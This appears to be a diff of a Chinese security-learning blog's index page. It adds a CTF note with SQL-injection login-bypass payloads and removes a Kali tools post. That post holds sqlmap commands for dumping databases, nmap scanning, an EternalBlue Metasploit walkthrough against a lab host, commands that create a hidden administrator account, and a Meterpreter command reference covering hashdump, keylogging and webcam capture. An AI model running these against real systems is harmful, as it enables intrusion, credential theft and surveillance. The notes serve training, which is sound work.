+<h2 id="登录就有flag"><a href="#登录就有flag" class="headerlink" title="登录就有flag"></a>登录就有flag</h2><p>分号可以用于闭合，井号可以用于注释，^进行异或运算，等号就是判等，这里需要利用sql的一个点“mysql弱类型转换”，<strong>空异或0会查到所有非数字开头的记录</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;^0#</span><br><span class="line">&#x27;^&#x27;&#x27;#</span><br></pre></td></tr></table></figure>
+
+<h3 id="WEB-AK赛"><a href="#WEB-AK赛" class="headerlink" title="WEB AK赛"></a>WEB AK赛</h3>
       
     </div>
 
@@ -418,7 +708,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-06-25 23:11:02" itemprop="dateModified" datetime="2023-06-25T23:11:02+08:00">2023-06-25</time>
+                <time title="修改时间：2023-07-09 00:28:25" itemprop="dateModified" datetime="2023-07-09T00:28:25+08:00">2023-07-09</time>
               </span>
 
           <br>
@@ -731,7 +1021,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-05-14 12:56:10" itemprop="dateModified" datetime="2023-05-14T12:56:10+08:00">2023-05-14</time>
+                <time title="修改时间：2023-07-01 23:46:24" itemprop="dateModified" datetime="2023-07-01T23:46:24+08:00">2023-07-01</time>
               </span>
 
           <br>
@@ -763,6 +1053,92 @@
           <!--noindex-->
             <div class="post-button">
               <a class="btn" href="/2023/04/29/%E7%88%86%E7%A0%B4/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/04/29/%E4%B8%AD%E6%9C%9F%E6%B5%8B%E8%AF%84/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/QQ%E5%9B%BE%E7%89%8720230109005650.jpg">
+      <meta itemprop="name" content="小zhou">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="not coder">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/04/29/%E4%B8%AD%E6%9C%9F%E6%B5%8B%E8%AF%84/" class="post-title-link" itemprop="url">中期测评</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-04-29 10:52:33" itemprop="dateCreated datePublished" datetime="2023-04-29T10:52:33+08:00">2023-04-29</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-06-10 20:45:49" itemprop="dateModified" datetime="2023-06-10T20:45:49+08:00">2023-06-10</time>
+              </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>30</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>1 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p> 中期测评</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2023/04/29/%E4%B8%AD%E6%9C%9F%E6%B5%8B%E8%AF%84/#more" rel="contents">
                 阅读全文 &raquo;
               </a>
             </div>
@@ -1127,323 +1503,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/04/03/kali%E5%B7%A5%E5%85%B7/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/QQ%E5%9B%BE%E7%89%8720230109005650.jpg">
-      <meta itemprop="name" content="小zhou">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="not coder">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/04/03/kali%E5%B7%A5%E5%85%B7/" class="post-title-link" itemprop="url">kali工具</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2023-04-03 23:48:25" itemprop="dateCreated datePublished" datetime="2023-04-03T23:48:25+08:00">2023-04-03</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-06-11 19:32:30" itemprop="dateModified" datetime="2023-06-11T19:32:30+08:00">2023-06-11</time>
-              </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>2.9k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>10 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-            <span id="more"></span>
-
-<h2 id="蚁剑下载"><a href="#蚁剑下载" class="headerlink" title="蚁剑下载"></a>蚁剑下载</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://gitee.com/AntSwordProject/AntSword-Loader</span><br></pre></td></tr></table></figure>
-
-<h2 id="behinder使用"><a href="#behinder使用" class="headerlink" title="behinder使用"></a>behinder使用</h2><p>下载地址</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/rebeyond/Behinder/releases</span><br></pre></td></tr></table></figure>
-
-<p>由于自己再windos下弄不好决定弄到kali上，kali没有java环境需要配置java环境</p>
-<p>下载解压，在目录里打开终端</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar Behinder.jar</span><br></pre></td></tr></table></figure>
-
-<p>behinder 普通的后门是用不了只能用behinder的后门连接</p>
-<h2 id="sqlmap使用"><a href="#sqlmap使用" class="headerlink" title="sqlmap使用"></a>sqlmap使用</h2><p>sqlmap常用命令总结：<br>注意：命令为kali linux中运行的 （windows中用python sqlmap.py执行）</p>
-<p>1#、注入六连：</p>
-<ol>
-<li><p>sqlmap -u  “<a target="_blank" rel="noopener" href="http://www.xx.com/?id=x">http://www.xx.com?id=x</a>“    【查询是否存在注入点</p>
-</li>
-<li><p>–dbs         【检测站点包含哪些数据库</p>
-</li>
-<li><p>–current-db    【获取当前的数据库名</p>
-</li>
-<li><p>–tables -D “db_name”  【获取指定数据库中的表名 -D后接指定的数据库名称</p>
-</li>
-<li><p>–columns  -T “table_name” -D “db_name”  【获取数据库表中的字段</p>
-</li>
-<li><p>–dump -C “columns_name” -T “table_name” -D “db_name”  【获取字段的数据内容</p>
-</li>
-</ol>
-<p>2#、COOKIE注入：<br>sqlmap -u “<a target="_blank" rel="noopener" href="http://www.xx.com/?id=x">http://www.xx.com?id=x</a>“ –cookie “cookie” –level 2  【cookie注入 后接cookie值</p>
-<p>3#、POST注入：<br>（1）目标地址http:&#x2F;&#x2F; <a target="_blank" rel="noopener" href="http://www.xxx.com/">www.xxx.com</a> &#x2F;login.asp<br>（2）打开brup代理。<br>（3）点击表单提交<br>（4）burp获取拦截信息（post）<br>（5）右键保存文件（.txt）到指定目录下<br>（6）运行sqlmap并执行如下命令：<br>用例：sqlmap -r okay.txt  -p  username</p>
-<p>&#x2F;&#x2F; -r表示加载文件(及步骤（5）保存的路径)，-p指定参数（即拦截的post请求中表单提交的用户名或密码等name参数）</p>
-<p>（7）自动获取表单：–forms自动获取表单</p>
-<p>例如：sqlmap -u <a target="_blank" rel="noopener" href="http://www.xx.com/login.asp">www.xx.com/login.asp</a> –forms</p>
-<p>（8）指定参数搜索：–data</p>
-<p>例如:sqlmap -u <a target="_blank" rel="noopener" href="http://www.xx.com/login.asp">www.xx.com/login.asp</a> –data “username&#x3D;1”</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">-u 指定目标URL (可以是http协议也可以是https协议)</span><br><span class="line"> </span><br><span class="line">-d 连接数据库</span><br><span class="line"> </span><br><span class="line">--dbs 列出所有的数据库</span><br><span class="line"> </span><br><span class="line">--current-db 列出当前数据库</span><br><span class="line"> </span><br><span class="line">--tables 列出当前的表</span><br><span class="line"> </span><br><span class="line">--columns 列出当前的列</span><br><span class="line"> </span><br><span class="line">-D 选择使用哪个数据库</span><br><span class="line"> </span><br><span class="line">-T 选择使用哪个表</span><br><span class="line"> </span><br><span class="line">-C 选择使用哪个列</span><br><span class="line"> </span><br><span class="line">--dump 获取字段中的数据</span><br><span class="line"> </span><br><span class="line">--batch 自动选择yes</span><br><span class="line"> </span><br><span class="line">--smart 启发式快速判断，节约浪费时间</span><br><span class="line"> </span><br><span class="line">--forms 尝试使用post注入</span><br><span class="line"> </span><br><span class="line">-r 加载文件中的HTTP请求（本地保存的请求包txt文件）</span><br><span class="line"> </span><br><span class="line">-l 加载文件中的HTTP请求（本地保存的请求包日志文件）</span><br><span class="line"> </span><br><span class="line">-g 自动获取Google搜索的前一百个结果，对有GET参数的URL测试</span><br><span class="line"> </span><br><span class="line">-o 开启所有默认性能优化</span><br><span class="line"> </span><br><span class="line">--tamper 调用脚本进行注入</span><br><span class="line"> </span><br><span class="line">-v 指定sqlmap的回显等级</span><br><span class="line"> </span><br><span class="line">--delay 设置多久访问一次</span><br><span class="line"> </span><br><span class="line">--os-shell 获取主机shell，一般不太好用，因为没权限</span><br><span class="line"> </span><br><span class="line">-m 批量操作</span><br><span class="line"> </span><br><span class="line">-c 指定配置文件，会按照该配置文件执行动作</span><br><span class="line"> </span><br><span class="line">-data data指定的数据会当做post数据提交</span><br><span class="line"> </span><br><span class="line">-timeout 设定超时时间</span><br><span class="line"> </span><br><span class="line">--level 设置注入探测等级</span><br><span class="line"> </span><br><span class="line">--risk 风险等级</span><br><span class="line"> </span><br><span class="line">--identify-waf 检测防火墙类型</span><br><span class="line"> </span><br><span class="line">--param-del=&quot;分割符&quot; 设置参数的分割符</span><br><span class="line"> </span><br><span class="line">--skip-urlencode 不进行url编码</span><br><span class="line"> </span><br><span class="line">--keep-alive 设置持久连接，加快探测速度</span><br><span class="line"> </span><br><span class="line">--null-connection 检索没有body响应的内容，多用于盲注</span><br><span class="line"> </span><br><span class="line">--thread 最大为10 设置多线程</span><br></pre></td></tr></table></figure>
-
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/songbai220/article/details/109303110">(10条消息) sqlmap使用教程(超详细)_Redmaple925的博客-CSDN博客</a></p>
-<h2 id="nmap使用"><a href="#nmap使用" class="headerlink" title="nmap使用"></a>nmap使用</h2><p>nmap常用命令<br>主机发现 </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-sL                     仅仅是显示,扫描的IP数目,不会进行任何扫描</span><br><span class="line">-sn                     ping扫描,即主机发现</span><br><span class="line">-Pn                     不检测主机存活</span><br><span class="line">-PS/PA/PU/PY[portlist]  TCP SYN Ping/TCP ACK Ping/UDP Ping发现</span><br><span class="line">-PE/PP/PM               使用ICMP echo, timestamp and netmask 请求包发现主机</span><br><span class="line">-PO[prococol list]      使用IP协议包探测对方主机是否开启   </span><br><span class="line">-n/-R                   不对IP进行域名反向解析/为所有的IP都进行域名的反响解析</span><br></pre></td></tr></table></figure>
-
-<p>awd主机发现</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">f=open(&#x27;pingtest.txt&#x27;,&#x27;w&#x27;)</span><br><span class="line">for i in range(255):</span><br><span class="line">    ip = &quot;192-168-1-&quot; + str(i) +&quot;.pvp2155.bugku.cn&quot;</span><br><span class="line">    f.write(ip+&#x27;\n&#x27;)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
-
-<p>批量扫描存货主机</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -iL /home/zhou/桌面/pingtest.txt -sn</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="dirsearch使用"><a href="#dirsearch使用" class="headerlink" title="dirsearch使用"></a>dirsearch使用</h2><p>常用于暴力扫描页面结构，包括网页中的目录和文件</p>
-<p>简单使用</p>
-<p>-u,–url                    目标url<br>-l,–url-list&#x3D;FILE          目标url文件路径<br>–stdin                     从标准输入中指定url<br>–cidr                      目标网段<br>–raw&#x3D;File                  从文件中读取request报文,通过-schema指定策略(如–schema https)</p>
-<p><a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=dirsearch&t=&u=&urw=">dirsearch- CSDN搜索</a> </p>
-<h2 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h2><p>永恒之蓝</p>
-<p>windos7镜像下载</p>
-<p><a target="_blank" rel="noopener" href="https://www.imsdn.cn/windows-server/windows-server-2008-r2/">Windows Server 2008 R2 ISO镜像下载 - 我的MSDN (imsdn.cn)</a></p>
-<p>1.启动msf</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
-
-<p>2.搜索可以用的模板</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search ms17-010</span><br></pre></td></tr></table></figure>
-
-<ol start="3">
-<li></li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use 3   #使用auxiliary/scanner/smb/smb_ms17_010  进行扫描是否存在MS17-010漏洞</span><br><span class="line">show options   #查看需要设置的参数</span><br><span class="line">set rhosts 192.168.158.150</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-
-
-
-<p>若存在如上图所示</p>
-<ol start="4">
-<li></li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">search ms17-010</span><br><span class="line">use 0 #exploit/windows/smb/ms17_010_eternalblue是永恒之蓝攻击代码</span><br><span class="line">show options   #查看需要设置的参数</span><br><span class="line">set rhosts 192.168.158.150 </span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-
-<p>攻击完成</p>
-<p>5.显示   win  字样</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">shell    #进入命令行</span><br><span class="line">chcp 65001    ##切换编码，解决乱码问题</span><br><span class="line">exit   #离开shell</span><br><span class="line">background #把我们获得的meterpreter会话挂载到后台运行</span><br><span class="line">sessions   #显示所有会话</span><br><span class="line">sessions id   #进入会话</span><br></pre></td></tr></table></figure>
-
-
-
-<ol start="6">
-<li></li>
-</ol>
-<p>1、创建新用户 ，语法：net user 用户名 密码 &#x2F;add</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user sss @123qwe /add</span><br><span class="line">net localgroup administrators sss /add  #将用户sss添加至管理员组</span><br></pre></td></tr></table></figure>
-
-
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br></pre></td><td class="code"><pre><span class="line">Meterpreter &gt; ?</span><br><span class="line">==========================================</span><br><span class="line">核心命令：</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">?                             帮助菜单</span><br><span class="line">background                    把当前会话挂到后台运行</span><br><span class="line">bg                            background命令的别名</span><br><span class="line">bgkill                        杀死后台meterpreter 脚本</span><br><span class="line">bglist                        列出正在运行的后台脚本</span><br><span class="line">bgrun                         执行一个meterpreter脚本作为后台线程</span><br><span class="line">channel                       显示信息或控制活动频道</span><br><span class="line">close                         关闭一个频道</span><br><span class="line">detach                        分离Meterpreter会话（用于 http/https）</span><br><span class="line">disable_unicode_encoding      禁用 unicode 字符串的编码</span><br><span class="line">enable_unicode_encoding       启用 unicode 字符串的编码</span><br><span class="line">exit                          终止 Meterpreter 会话</span><br><span class="line">get_timeouts                  获取当前会话超时值</span><br><span class="line">guid                          获取会话 GUID</span><br><span class="line">help                          帮助菜单</span><br><span class="line">info                          显示有关 Post 模块的信息</span><br><span class="line">irb                           在当前会话中打开一个交互式 Ruby shell</span><br><span class="line">load                          加载一个或多个 Meterpreter 扩展</span><br><span class="line">machine_id                    获取连接到会话的机器的 MSF ID</span><br><span class="line">migrate                       将服务器迁移到另一个进程</span><br><span class="line">pivot                         管理枢轴侦听器</span><br><span class="line">pry                           在当前会话上打开 Pry 调试器</span><br><span class="line">quit                          终止 Meterpreter 会话</span><br><span class="line">read                          从通道读取数据</span><br><span class="line">resource                      运行存储在文件中的命令</span><br><span class="line">run                           执行一个 Meterpreter 脚本或 Post 模块</span><br><span class="line">secure                       （重新）协商会话上的 TLV 数据包加密</span><br><span class="line">sessions                      快速切换到另一个会话</span><br><span class="line">set_timeouts                  设置当前会话超时值</span><br><span class="line">sleep                         强制 Meterpreter 安静，然后重新建立会话</span><br><span class="line">ssl_verify                    修改 SSL 证书验证设置</span><br><span class="line">transport                     管理运输机制</span><br><span class="line">use                           不推荐使用的load命令别名</span><br><span class="line">uuid                          获取当前会话的 UUID</span><br><span class="line">write                         将数据写入通道</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Stdapi：文件系统命令</span><br><span class="line">==========================================</span><br><span class="line"></span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">cat                           将文件内容读到屏幕上</span><br><span class="line">cd                            切换目录</span><br><span class="line">checksum                      检索文件的校验和</span><br><span class="line">cp                            将源复制到目标</span><br><span class="line">del                           删除指定文件</span><br><span class="line">dir                           列出文件（ls 的别名）</span><br><span class="line">download                      下载文件或目录</span><br><span class="line">edit                          编辑文件</span><br><span class="line">getlwd                        打印本地工作目录</span><br><span class="line">getwd                         打印工作目录</span><br><span class="line">lcd                           更改本地工作目录</span><br><span class="line">lls                           列出本地文件</span><br><span class="line">lpwd                          打印本地工作目录</span><br><span class="line">ls                            列出文件</span><br><span class="line">mkdir                         制作目录</span><br><span class="line">mv                            将源移动到目标</span><br><span class="line">pwd                           打印工作目录</span><br><span class="line">rm                            删除指定文件</span><br><span class="line">rmdir                         删除目录</span><br><span class="line">search                        搜索文件</span><br><span class="line">show_mount                    列出所有挂载点/逻辑驱动器</span><br><span class="line">upload                        上传文件或目录</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Stdapi：网络命令</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">arp                           显示主机 ARP 缓存</span><br><span class="line">getproxy                      显示当前代理配置</span><br><span class="line">ifconfig                      显示界面</span><br><span class="line">ipconfig                      显示接口</span><br><span class="line">netstat                       显示网络连接</span><br><span class="line">portfwd                       将本地端口转发到远程服务</span><br><span class="line">resolve                       解析目标上的一组主机名</span><br><span class="line">route                         查看和修改路由表</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Stdapi：系统命令</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">clearev                       清除事件日志</span><br><span class="line">drop_token                    放弃任何活动的模拟令牌。</span><br><span class="line">execute                       执行命令</span><br><span class="line">getenv                        获取一个或多个环境变量值</span><br><span class="line">getpid                        获取当前进程标识符</span><br><span class="line">getprivs                      尝试启用当前进程可用的所有权限</span><br><span class="line">getid                         获取服务器运行的用户的 SID</span><br><span class="line">getuid                        获取服务器运行的用户</span><br><span class="line">kill                          终止进程</span><br><span class="line">localtime                     显示目标系统本地日期和时间</span><br><span class="line">pgrep                         按名称过滤进程</span><br><span class="line">pkill                         按名称终止进程</span><br><span class="line">ps                            列出正在运行的进程</span><br><span class="line">reboot                        重启远程计算机</span><br><span class="line">reg                           修改远程注册表并与之交互</span><br><span class="line">rev2self                      在远程机器上调用 RevertToSelf()</span><br><span class="line">shell                         放入系统命令 shell</span><br><span class="line">shutdown                      关闭远程计算机</span><br><span class="line">steal_token                   尝试从目标进程窃取模拟令牌</span><br><span class="line">suspend                       暂停或恢复进程列表</span><br><span class="line">sysinfo                       获取有关远程系统的信息，例如 OS</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Stdapi：用户界面命令</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">enumdesktops                  列出所有可访问的桌面和窗口站</span><br><span class="line">getdesktop                    获取当前的meterpreter桌面</span><br><span class="line">idletime                      返回远程用户空闲的秒数</span><br><span class="line">keyboard_send                 发送击键</span><br><span class="line">keyevent                      发送按键事件</span><br><span class="line">keyscan_dump                  转储击键缓冲区</span><br><span class="line">keyscan_start                 开始捕获击键</span><br><span class="line">keyscan_stop                  停止捕获击键</span><br><span class="line">mouse                         发送鼠标事件</span><br><span class="line">screenshare                   实时观看远程用户桌面</span><br><span class="line">screenshot                    抓取交互式桌面的截图</span><br><span class="line">setdesktop                    更改meterpreters当前桌面</span><br><span class="line">uictl                         控制一些用户界面组件</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Stdapi：网络摄像头命令：</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">record_mic                    从默认麦克风录制音频 X 秒</span><br><span class="line">webcam_chat                   开始视频聊天</span><br><span class="line">webcam_list                   列出网络摄像头</span><br><span class="line">webcam_snap                   从指定的网络摄像头拍摄快照</span><br><span class="line">webcam_stream                 从指定的网络摄像头播放视频流</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Stdapi：音频输出命令：</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">play                          在目标系统上播放波形音频文件 (.wav)</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Priv：权限提升命令：</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">getsystem                     尝试将您的权限提升到本地系统的权限。</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Priv：密码数据库命令：</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">hashdump                      转储 SAM 数据库的内容</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Priv：Timestomp 命令：</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">timestomp                     操作文件 MACE 属性</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
-
